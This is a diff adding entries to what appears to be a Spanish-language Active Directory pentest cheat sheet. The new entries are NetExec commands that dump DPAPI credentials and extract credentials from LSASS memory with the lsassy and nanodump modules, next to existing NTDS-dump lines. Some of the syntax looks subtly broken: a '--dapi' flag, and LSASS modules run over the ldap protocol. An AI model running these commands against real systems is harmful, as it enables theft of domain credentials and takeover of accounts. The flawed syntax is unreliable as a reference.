@@ -147,6 +147,22 @@ netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --ntds vss
 netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --pass-pol
 ```
 
+#### Dumpear DPAPI Password Credentials
+```
+netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --dapi
+```
+
+#### Obtener credenciales directamente de LSASS
+```
+netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy
+```
+
+#### Dumpear de forma remota el contenido de LSASS utilizando la herramienta NanoDump
+```
+netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M nanodump
+```
+
+
 #### Obtener la politica de contraseñas del AD
 ```
 netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M pso
